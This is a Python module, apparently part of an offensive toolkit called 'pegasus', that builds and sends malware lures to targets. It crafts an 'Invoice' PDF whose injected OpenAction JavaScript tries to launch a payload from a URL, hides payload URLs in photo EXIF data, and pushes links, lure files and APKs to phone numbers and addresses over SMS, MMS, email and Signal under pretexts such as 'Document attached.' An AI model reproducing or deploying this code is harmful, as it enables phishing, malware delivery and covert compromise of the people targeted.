"""Twilio/SendGrid channels, plus the PDF and EXIF builders."""
import io
import os
import pathlib
import tempfile

import piexif
from reportlab.pdfgen import canvas

from pegasus.core.config import public_url

from . import landing, twilio_channel

LEGACY = ("sms", "mms", "email", "signal")
JS = "this.exportDataObject({{cName:'{url}', nLaunch:2}});"


def _tmp(suffix: str) -> str:
    fd, path = tempfile.mkstemp(suffix=f".{suffix}",
                                dir=os.environ.get("PEGASUS_TMP"))
    os.close(fd)
    return path


def build_pdf(out: str, payload_url: str, label: str = "Invoice") -> str:
    buf = io.BytesIO()
    c = canvas.Canvas(buf)
    c.setFont("Helvetica-Bold", 18)
    c.drawString(72, 760, label)
    c.setFont("Helvetica", 11)
    c.drawString(72, 736, "Open to view the attached document.")
    c.save()
    blob = buf.getvalue()
    action = f"<< /S /JavaScript /JS ({JS.format(url=payload_url)}) >>".encode()
    blob = blob.replace(b"/Root 1 0 R", b"/Root 9999 0 R")
    idx = blob.rfind(b"startxref")
    extra = (f"9999 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction ".encode()
             + action + b" >>\nendobj\n")
    blob = blob[:idx] + extra + blob[idx:]
    pathlib.Path(out).write_bytes(blob)
    return out


def build_photo(src: str, out: str, payload_url: str) -> str:
    exif = {"0th": {},
            "Exif": {piexif.ExifIFD.UserComment:
                     b"ASCII\x00\x00\x00" + payload_url.encode()},
            "1st": {}, "GPS": {}}
    piexif.insert(piexif.dump(exif), src, out)
    return out


def dispatch(channel: str, kind: str, target: str, body: dict) -> dict:
    if channel == "signal":
        return {"link": f"sgnl://signal.me/#p/{target}", "carrier": "link"}
    if kind == "link":
        token = landing.mint({"pdf": body.get("pdf_url"), "apk": body.get("apk_url"),
                              "photo": body.get("photo_url")})
        if channel in ("sms", "mms"):
            return {"sent": twilio_channel.send_mms(
                target, body.get("message") or "Document attached.",
                f"{public_url()}/l/{token}"), "carrier": "link"}
        return {"link": f"{public_url()}/l/{token}", "carrier": "link"}
    if kind == "pdf_lure":
        path = build_pdf(_tmp("pdf"), body.get("payload_url") or public_url(),
                         body.get("label", "Invoice"))
        return {"sent": twilio_channel.send_file(channel, target, path,
                                                 body.get("message", ""), False),
                "carrier": "pdf_lure", "js_capable": False}
    if kind == "photo":
        path = build_photo(body["src"], _tmp("jpg"),
                           body.get("payload_url") or public_url())
        return {"sent": twilio_channel.send_file(channel, target, path),
                "carrier": "photo"}
    if kind == "apk":
        return {"sent": twilio_channel.send_file(channel, target, body["apk_path"]),
                "carrier": "apk"}
    raise ValueError(f"unsupported {kind} for {channel}")
